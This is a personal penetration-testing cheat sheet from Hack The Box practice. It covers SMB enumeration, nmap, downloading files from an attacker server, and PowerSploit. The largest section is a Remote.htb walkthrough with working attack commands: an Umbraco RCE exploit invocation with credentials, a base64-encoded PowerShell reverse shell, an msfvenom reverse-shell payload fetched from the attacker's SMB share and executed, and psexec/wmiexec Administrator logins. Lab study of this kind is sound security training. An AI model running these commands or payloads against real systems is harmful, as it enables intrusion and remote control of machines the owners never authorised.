### Index

1.  Links
2.  Samba
3.  CURL
4. Ways to get the shell 
5. PowerShell and AD

### Links

[LZone Cheat Sheet](https://lzone.de/#/LZone%20Cheat%20Sheets)  - Someone Name Lzone prepare a nice checklist on Docker container, CI/CD and various other things. Good One to check out

[CyberKhalid Cheat Sheet](https://cyberkhalid.github.io/categories/) - Just Another Checklist (FTP, AD, Kerberos, LDAP, Linux Persistence, Linux Privilege Escalation, SNMP, SSH, VNC, Windows Persistence, Telnet, etc.)

[Windows Privilege Escalation](https://github.com/x0xr00t/PayloadsAllTheThings-1/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)  - PayloadAllTheThing GitHub Repo

[Windows List of Privileges and Possible Ways to Exploit It](https://github.com/gtworek/Priv2Admin?tab=readme-ov-file)  - Scroll Down a bit to check the list.

[Windows : Early Enumerations and Privilege Escalation](https://notes.shashwatshah.me/windows/local-privilege-escalation/privileges-information)  - Expand the list from the left menu

[The Hacker Recipes](https://www.thehacker.recipes) - Its Just Like HackTricks

### Samba

Trying to List smb share using Guest account \
```
netexec smb 10.10.10.111 -u Guest -p "" --shares 
netexec --verbose smb 10.10.10.111 -u Guest -p "" --shares
```

Dumbing Password Policy through SMB Share
```
netexec --verbose smb 10.10.10.111 -u Guest -p "" --pass-pol
```

Spidering SMB shares

```
netexec --verbose smb 10.10.10.111 -u Guest -p "" --spider IPC$
```

Listing the SMB Shares without password using smbclient

```
$ smbclient --no-pass -L 10.10.10.134
```

### Nmap

Always run the nmap command in the following manner.
```
$ nmap -p- --min-rate=1000 -Pn -T4 -sC -sV <IP>
```

If you put the -sC or -sV parameters before --min-rate than your results might not have the Ports/Service versions.


Ongoing notes...Will add things later as I found during HTB machines

### CURL 

To Download the file on the target.
```
Start the Python Server on Kali
python -m http.server 80

Run the following Command in Windows if Curl is Installed
curl -o FileName http://Kali_IP/FileName
```

### Ways to Get The Shell

###### RCE to Shell

During the Remote.htb, I had the following scenario.
```
$ python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c whoami
iis apppool\defaultapppool
```

###### Getting Shell When you have password

Getting Shell from RCE was achieved as follows
```
## Failed Attempt of using powershell

python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a '-e JExIT1NUID0gIjEwLjEwLjE2LjUiOyAkTFBPUlQgPSA0NDQ0OyAkVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJExIT1NULCAkTFBPUlQpOyAkTmV0d29ya1N0cmVhbSA9ICRUQ1BDbGllbnQuR2V0U3RyZWFtKCk7ICRTdHJlYW1SZWFkZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVJlYWRlcigkTmV0d29ya1N0cmVhbSk7ICRTdHJlYW1Xcml0ZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVdyaXRlcigkTmV0d29ya1N0cmVhbSk7ICRTdHJlYW1Xcml0ZXIuQXV0b0ZsdXNoID0gJHRydWU7ICRCdWZmZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5CeXRlW10gMTAyNDsgd2hpbGUgKCRUQ1BDbGllbnQuQ29ubmVjdGVkKSB7IHdoaWxlICgkTmV0d29ya1N0cmVhbS5EYXRhQXZhaWxhYmxlKSB7ICRSYXdEYXRhID0gJE5ldHdvcmtTdHJlYW0uUmVhZCgkQnVmZmVyLCAwLCAkQnVmZmVyLkxlbmd0aCk7ICRDb2RlID0gKFt0ZXh0LmVuY29kaW5nXTo6VVRGOCkuR2V0U3RyaW5nKCRCdWZmZXIsIDAsICRSYXdEYXRhIC0xKSB9OyBpZiAoJFRDUENsaWVudC5Db25uZWN0ZWQgLWFuZCAkQ29kZS5MZW5ndGggLWd0IDEpIHsgJE91dHB1dCA9IHRyeSB7IEludm9rZS1FeHByZXNzaW9uICgkQ29kZSkgMj4mMSB9IGNhdGNoIHsgJF8gfTsgJFN0cmVhbVdyaXRlci5Xcml0ZSgiJE91dHB1dGBuIik7ICRDb2RlID0gJG51bGwgfSB9OyAkVENQQ2xpZW50LkNsb3NlKCk7ICROZXR3b3JrU3RyZWFtLkNsb3NlKCk7ICRTdHJlYW1SZWFkZXIuQ2xvc2UoKTsgJFN0cmVhbVdyaXRlci5DbG9zZSgp'

## Successful Attempt
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f exe -o revshell.exe
$ impacket-smbserver a /home/ringbuffer/Downloads/Remote.htb -smb2support
$ python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 'net use \\10.10.14.4\a'
$ python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 'copy //10.10.14.4/a/revshell.exe C:/Windows/Temp/revshell.exe'
$ python Umbraco_RCE.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a 'C:/Windows/Temp/revshell.exe' #Make sure the listener is On in another tab
```

During Privilege Escalation for the Remote.HTB, I got the Administrator Credentials but getting shell was something i spent my time on. So here are few ways to get a direct shell if you have a credentials.

Using `Impacket-psexec`

```
$ impacket-psexec 'Administrator:!R3m0te!@10.10.10.180' 
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.10.180.....
[*] Found writable share ADMIN$
[*] Uploading file gZTCDlfJ.exe
[*] Opening SVCManager on 10.10.10.180.....
[*] Creating service xWJX on 10.10.10.180.....
[*] Starting service xWJX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

Using `impacket-wmiexec`
```
$ impacket-wmiexec 'Administrator:!R3m0te!@10.10.10.180'                      
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
remote\administrator
```

Using `smbclient`
```
$ smbclient -U Administrator \\\\10.10.10.180\\C$
Password for [WORKGROUP\Administrator]:!R3m0te!    # Provide the Admin Password Here
```


### PowerShell & Active Directory

##### Print all the environment variables using powershell.
```
Get-ChildItem env:
```

Importing PowerSploit and Other modules 
```
*Evil-WinRM* PS C:\Program Files\WindowsPowerShell\Modules\PowerSploit> Import-Module PowerSploit\Recon
*Evil-WinRM* PS C:\Program Files\WindowsPowerShell\Modules\PowerSploit> Import-Module PowerSploit\Privesc
```
Note that I am inside the PowerSploit directory where Recon and Privesc directories are located. Now you can retrieve the command for each module like this.

```
*Evil-WinRM* PS C:\Program Files\WindowsPowerShell\Modules\PowerSploit> Get-Command -Module Recon

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Function        Add-NetUser                                        3.0.0.0    Recon
```

Copy the whole PowerSploit Directory as follows
```
*Evil-WinRM* PS C:\tmp\PowerSploit> Copy-Item PowerSploit "C:\Program Files\WindowsPowerShell\Modules" -recurse -Force
```

